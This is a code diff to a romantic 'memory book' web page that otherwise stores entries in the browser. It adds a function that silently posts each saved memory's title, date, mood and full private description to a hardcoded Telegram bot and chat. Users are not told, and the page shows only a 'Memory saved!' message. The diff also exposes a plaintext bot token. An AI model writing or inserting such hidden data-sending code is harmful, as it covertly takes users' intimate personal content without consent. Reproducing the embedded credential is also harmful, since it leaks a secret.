@@ -143,7 +143,7 @@
             }
         }
 
-        function saveMemoryToStorage(memory) {
+        async function saveMemoryToStorage(memory) {
             memories.push(memory);
             localStorage.setItem('loveMemories', JSON.stringify(memories));
             
@@ -153,6 +153,9 @@
             
             // Success animation
             showSuccessMessage('Memory saved! 💖');
+
+            // Send memory to Telegram
+            await sendMemoryToTelegram(memory);
         }
 
         function displayMemories() {
@@ -244,6 +247,66 @@
             link.click();
 
             showSuccessMessage('Memories exported! 📤💖');
+        }
+
+        async function sendMemoryToTelegram(memory) {
+            const botToken = '7723720692:AAEPmC39DWtRqL5BtR0ataTaKn4PF0HoCJs';
+            const chatId = '6649936329';
+
+            const formattedDate = new Date(memory.date).toLocaleDateString('en-US', { 
+                weekday: 'long', 
+                year: 'numeric', 
+                month: 'long', 
+                day: 'numeric'
+            });
+
+            const photoInfo = memory.photo ? '📷 Photo included in memory' : '📝 Text-only memory';
+
+            const telegramMessage = `📖✨ NEW LOVE MEMORY CREATED! ✨📖
+
+💕 Someone just added a beautiful memory to their Love Memory Book!
+
+═══ 📋 MEMORY DETAILS ═══
+🏷️ Title: ${memory.title}
+📅 Date: ${formattedDate}
+😊 Mood: ${memory.mood}
+${photoInfo}
+
+💌 Memory Description:
+"${memory.description}"
+
+⏰ Added: ${new Date(memory.createdAt).toLocaleString('en-US', { 
+    weekday: 'long', 
+    year: 'numeric', 
+    month: 'long', 
+    day: 'numeric',
+    hour: '2-digit',
+    minute: '2-digit'
+})}
+
+💖 Someone is treasuring their love journey!
+📚 Building beautiful memories one moment at a time! ✨
+
+#LoveMemory #MemoryBook #ExpressingLove #Romance`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: telegramMessage
+                    })
+                });
+
+                if (!response.ok) {
+                    console.error('Failed to send memory to Telegram');
+                }
+            } catch (error) {
+                console.error('Error sending memory to Telegram:', error);
+            }
         }
 
         function showSuccessMessage(message) {
